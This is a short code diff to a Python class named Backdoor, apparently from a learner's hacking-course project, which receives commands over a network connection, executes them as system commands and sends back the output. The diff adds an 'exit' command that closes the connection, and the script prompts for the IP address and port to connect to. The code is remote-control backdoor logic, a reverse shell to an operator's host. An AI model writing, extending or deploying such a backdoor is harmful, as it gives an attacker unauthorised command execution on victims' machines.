@@ -34,11 +34,14 @@ class Backdoor:
         while True:
             #command = self.connection.recv(1024) #receive, specify buffer size
             command = self.reliable_receive() #receive, specify buffer size
+            if command[0] == "exit": #if first element of new command list contains exit (did user type exit)
+                #this works because data is sent as json object and unpacked first; receives var command as list
+                self.connection.close()
+                exit()
             command_result = self.execute_system_command(command) #specify SELF.function -
             #need to specify self since calling function from within class
             #self.connection.send(command_result)
             self.reliable_send(command_result)
-        connection.close()
     
 ip = raw_input("Enter IP Address: ")
 port = int(raw_input("Enter port number to use: "))
